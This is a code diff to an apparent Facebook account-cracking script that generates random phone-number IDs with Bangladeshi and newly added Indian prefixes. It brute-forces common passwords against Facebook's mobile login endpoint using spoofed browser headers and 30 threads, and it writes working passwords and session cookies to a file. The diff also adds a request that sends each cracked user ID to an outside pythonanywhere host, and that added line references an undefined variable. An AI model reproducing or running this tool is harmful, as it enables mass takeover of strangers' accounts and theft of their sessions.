@@ -14,7 +14,7 @@ class jalan:
             sys.stdout.write(e)
             sys.stdout.flush()
             time.sleep(0.040)
-os.system("xdg-open https://www.facebook.com/profile.php?id=100072828519575/")
+# os.system("xdg-open https://www.facebook.com/profile.php?id=100072828519575/")
 #-----------------------[ COLOR-CODE ]-----------------------#
 W='\033[1;37m'
 GR='\033[38;5;44m'
@@ -69,12 +69,11 @@ logo=("""
 \033[38;5;196m─────────────────────────────────────────────
 \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m DEVELOPR\033[38;5;196m : \x1b[38;5;46m Rotoŋ-999 CYBER
 \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m FACEBOOK\033[38;5;196m  :\x1b[38;5;46m Rotoŋ Mʌɭɭɩĸ
-\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m VERSION \033[38;5;196m  :\x1b[38;1;97m 0\x1b[38;5;97m•\x1b[38;5;46m0.5
+\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m VERSION \033[38;5;196m  :\x1b[38;1;97m 0\x1b[38;5;97m•\x1b[38;5;46m0.7
 \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m STATUS \033[38;5;196m   :\x1b[38;5;46m FREE
 \033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m TOOOLS \033[38;5;196m   :\x1b[38;5;46m RANDOM\x1b[38;5;97m•\x1b[38;5;46mFILE
 \033[38;5;196m─────────────────────────────────────────────""")
 #--------------------[ FUCK-MANU ]---------------------#
-
 def fuck():
   os.system('clear')
   print(logo)
@@ -98,14 +97,18 @@ def fuck():
       approval()
   except:
     sys.exit()
+
     
 def morshed_M():
         clear()
-        print(f'{GR}[{G}1{GR}] {W}RANDOM CRACKING{W} ')
-        print(f'{GR}[{G}2{GR}] {W}EXIT{W}');linex()
+        print(f'{GR}[{G}1{GR}] {W}RANDOM BD{W} ')
+        print(f'{GR}[{G}2{GR}] {W}RANDOM IND{W} ')
+        print(f'{GR}[{G}3{GR}] {W}EXIT{W}');linex()
         sadia=input('\033[38;5;44m[\033[38;5;46m?\033[38;5;44m] \033[1;37mCHOOSE  \033[38;5;196m : \033[38;5;46m  ')
-        if sadia in '1':
+        if sadia in '1':      
             rndm()
+        elif sadia in '2':
+        	india()
 def clear():
         os.system('clear')
         print(logo)
@@ -115,7 +118,7 @@ def linex():
 morshed=[]
 def rndm():
         clear()
-        print(f'{K} SIM CODE  {R}:{G} 017,018,019,016');linex()
+        print(f'{K} SIM CODE  {R}:{G} 017,018,019,016,014');linex()
         code = input(f'{K} CHOOSE  {R}:{G} ')
         clear()
         print(f'{K} CRACK ID  {R}:{G} 2000,4000,6000,10000');linex()
@@ -149,6 +152,44 @@ def rndm():
         linex()
         input(f'{W} enter to main_menu')
         fuck()
+#------ind-----#
+morshed=[]
+def india():
+        clear()
+        print(f' SIM CODE : +91639  +91629 +91961');linex()
+        code = input(f'{K} CHOOSE  {R}:{G} ')
+        clear()
+        print(f'{K} CRACK ID  {R}:{G} 2000,4000,6000,10000');linex()
+        limit = int(input(f'{K} CHOOSE  {R}:{G} '))
+        linex()
+        clear()
+        print("\033[38;5;196m[\x1b[38;5;46m1\033[38;5;196m]\x1b[38;5;46m METHOD•BD")
+        print("\033[38;5;196m[\x1b[38;5;46m2\033[38;5;196m]\x1b[38;5;46m METHOD•MIX")
+        linex()
+        morshed=input(f'\x1b[1;92m SELECT METHOD : ')
+        for __BLACK__ in range(limit):
+                _Xx_ = ''.join(random.choice(string.digits) for _ in range(8))
+                user.append(_Xx_)
+        with tred(max_workers=30) as _BLACK_:
+                tl = str(len(user))
+                clear()
+                print(f'\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m SIM CODE  : \033[38;5;46m{code}')
+                print(f'\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m TOTAL IDS : \033[38;5;46m{tl}')
+                print(f"\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m METHOD M{morshed}")
+                print(f'\033[38;5;196m[\x1b[38;5;46m+\033[38;5;196m]\x1b[38;5;46m\033[1;97m FIRST \033[1;34m[\033[1;32mON\033[1;97m/\033[38;5;196mOFF\033[1;34m] \033[1;97mAIRPLANE MODE🌺');linex()
+                for love in user:
+                        ids = code + love 
+                        pasx = ['57575751','57273200','59039200',ids,love,ids[3:]]
+                        if morshed in ['1','1']:
+                            _BLACK_.submit(_M1_,ids,pasx)
+                        if morshed in ['2','2']:
+                            _BLACK_.submit(_M2_,ids,pasx)
+        print('')
+        linex()
+        print(f'{W} Total Ok : {str(len(ok))}')
+        linex()
+        input(f'{W} enter to main_menu')
+        fuck() 
 #----------M1 DEF----------#
 def _M1_(ids,pasx):
         global loop,ok
@@ -176,34 +217,36 @@ def _M1_(ids,pasx):
                         'path': '/login/device-based/login/async/',
                         'scheme': 'https',
                         'accept': '*/*',
-  				      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-					    'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+					    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  					  'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
   					  'cache-control': 'max-age=0',
- 					   'dpr': '2.700000047683716',
-  					  'sec-ch-prefers-color-scheme': 'light',
+					    'dpr': '2.700000047683716',
+ 					   'sec-ch-prefers-color-scheme': 'light',
  					   'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
   					  'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
-  					  'sec-ch-ua-mobile': '?1',
-  					  'sec-ch-ua-model': '"POCO M2 Pro"',
+					    'sec-ch-ua-mobile': '?1',
+ 					   'sec-ch-ua-model': '"POCO M2 Pro"',
  					   'sec-ch-ua-platform': '"Android"',
- 					   'sec-ch-ua-platform-version': '"12.0.0"',
-					    'sec-fetch-dest': 'document',
-   					 'sec-fetch-mode': 'navigate',
+  					  'sec-ch-ua-platform-version': '"12.0.0"',
+ 					   'sec-fetch-dest': 'document',
+ 					   'sec-fetch-mode': 'navigate',
 					    'sec-fetch-site': 'none',
-   					 'sec-fetch-user': '?1',
- 					   'upgrade-insecure-requests': '1',
-  					  'user-agent': pro}
+					    'sec-fetch-user': '?1',
+  					  'upgrade-insecure-requests': '1',
+					    'user-agent': pro}
                         lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=apple,headers=tedy).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
                                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                                 uid = re.findall('c_user=(.*);xs', coki)[0]
-                                print(f'\r\r{G}[ROTON-OKðŸŒº]: {uid} âž¤ {ps}')
-                                print(f"\r\033[38;5;46mCOOKIES=[ðŸŒº]: {coki}\33[1;37m")
-                                print(f'\033[38;5;196mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\033[1;37m')
-                                open('/sdcard/ROTON-OK.txt','a').write(str(uid)+'|'+ps+'|'+coki+'\n')
-                                ok.append(uid)
-                                break
+                                res = requests.get(f"https://rajx.pythonanywhere.com/live?uid={cid}").text
+                                if res == 'LIVE':                       	
+                                    print(f'\r\r{G}[ROTON-OKðŸŒº]: {uid} âž¤ {ps}')
+                                    print(f"\r\033[38;5;46mCOOKIES=[ðŸŒº]: {coki}\33[1;37m")
+                                    print(f'\033[38;5;196mâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\033[1;37m')
+                                    open('/sdcard/ROTON-OK.txt','a').write(str(uid)+'|'+ps+'|'+coki+'\n')
+                                    ok.append(uid)
+                                    break
                         elif 'checkpoint' in BLACK:
                                 print(f'\r\r {R}[ROTON-CP] {uid} | {ps}')
                                 open('/sdcard/ROTON-CP.txt','a').write(str(uid)+'|'+ps+'\n')
@@ -241,23 +284,23 @@ def _M2_(ids,pasx):
                         'path': '/login/device-based/login/async/',
                         'scheme': 'https',
                         'accept': '*/*',
-   					 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
- 					   'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+  					  'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+  					  'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
 					    'cache-control': 'max-age=0',
- 					   'dpr': '2.700000047683716',
+  					  'dpr': '2.700000047683716',
  					   'sec-ch-prefers-color-scheme': 'light',
- 					   'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-					    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
+					    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
+ 					   'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.26"',
   					  'sec-ch-ua-mobile': '?1',
- 					   'sec-ch-ua-model': '"POCO M2 Pro"',
- 					   'sec-ch-ua-platform': '"Android"',
-   					 'sec-ch-ua-platform-version': '"12.0.0"',
+  					  'sec-ch-ua-model': '"POCO M2 Pro"',
+					    'sec-ch-ua-platform': '"Android"',
+					    'sec-ch-ua-platform-version': '"12.0.0"',
 					    'sec-fetch-dest': 'document',
- 					   'sec-fetch-mode': 'navigate',
-  					  'sec-fetch-site': 'none',
- 					   'sec-fetch-user': '?1',
-   					 'upgrade-insecure-requests': '1',
-  					  'user-agent': pro}
+					    'sec-fetch-mode': 'navigate',
+ 					   'sec-fetch-site': 'none',
+  					  'sec-fetch-user': '?1',
+ 					   'upgrade-insecure-requests': '1',
+ 					   'user-agent': pro}
                         lo = session.post('https://p.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=apple,headers=tedy).text
                         BLACK=session.cookies.get_dict().keys()
                         if 'c_user' in BLACK:
